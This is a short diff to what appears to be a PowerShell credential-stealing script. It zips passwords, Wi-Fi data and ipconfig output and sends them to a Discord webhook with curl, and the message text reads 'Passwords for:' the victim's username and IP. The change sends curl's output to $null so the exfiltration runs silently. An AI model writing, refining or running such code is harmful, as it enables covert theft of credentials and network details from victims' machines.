@@ -11,7 +11,7 @@ ipconfig /all | Out-File -FilePath "$e\ipcfg.txt" # save ipconfig as a file
 #send to discord
 
 #send http
-& curl.exe -F "content=Passwords for: $whoami_content | IP: $ip_add | @everyone" -F "file1=@$zip" -F "file2=@$e\wifi.txt" -F "file3=@$e\ipcfg.txt" $wh
+& curl.exe -F "content=Passwords for: $whoami_content | IP: $ip_add | @everyone" -F "file1=@$zip" -F "file2=@$e\wifi.txt" -F "file3=@$e\ipcfg.txt" $wh > $null 2>&1
 
 
 # cleanup
